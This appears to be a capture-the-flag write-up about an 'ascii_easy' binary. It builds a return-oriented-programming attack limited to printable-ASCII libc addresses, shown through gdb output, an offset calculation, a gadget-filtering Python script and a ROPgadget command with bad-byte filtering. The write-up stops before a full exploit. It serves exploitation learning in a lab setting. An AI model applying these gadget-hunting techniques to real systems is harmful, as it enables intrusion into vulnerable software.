# Solve Process
My first thought was: "Oh! We know the address of libc! All we need is to call system with /bin/sh."

But wait... 0x5555e000 will always not be possible to input with printable ascii chars only. Maybe there are some functions within libc that are in our disposal? hopefully, system?


`gdb-peda$ print &system
$1 = (<text variable, no debug info> *) 0x3eed0 <system>`
 0x5555e000+0x3eed0= 0x5559CED0 fuck. It seems the author intentionally prevented us access to the system function

```bash
rop ascii_easy | grep "pop edi" | awk '{print $1}'  > pop_edi_addr.txt
```
first run this command, to see if we have some printable pop edi gadgets. 

Right, so the entire .text section starts with 0x80, which pretty much gurantees we won't have any ascii-addresses gadgets here.

Maybe we can try to call an arbitrary location before system:
`
0x5559CED0-0x5F61 = 0x55596F6F
`
`
0x3eed0 -0x5F61 = 0x38F6F
`

Inputting that into IDA we find:

`
text:00038F6E                 mov     ebp, [eax+24h]
`

Which means this will be loaded at `0x55596F6E`.


Now we need to satisfy the condition

```bash

rop libc-2.15.so | grep "pop ebx" | awk '{print $1}'

```
Wayyyy too many gadgets to manually check if they are ascii-satisfiable, so we'll make a python program and pipe them with xargs.

```python
import sys

def is_ascii(byte):
    return 0x20 <= byte <= 0x7F

def main():
    if(len(sys.argv) <2):
        print(f"usage python {sys.argv[0]} <ascii_num>")
        exit(1)
    # Input string with ASCII number
    input_hex = sys.argv[1]# Change this to test different inputs

    # Convert input hex string to an integer
    number = int(input_hex, 16)

    # Add 0x5555e000
    result = number + 0x5555e000

    # Convert result to bytes
    result_bytes = result.to_bytes((result.bit_length() + 7) // 8, byteorder='big')

    if all(is_ascii(byte) for byte in result_bytes):
        print(f"Received value: {hex(result)}")  # Print the result in hexadecimal format

if __name__ == "__main__":
    main()
```

```bash
rop libc-2.15.so | grep "pop ebx" | awk '{print $1}' | xargs -I {} python is_ascii.py {}
```


[!NOTE] Only after making the script, I realized ropgadget had some useful options exactly for this:

```bash
ROPgadget --binary libc-2.15.so --offset 5555e000 --badbytes "00-20|80-ff"| grep -F "$1" | awk '{print $1}'
```

Oh well. Always read the documenation I suppose.
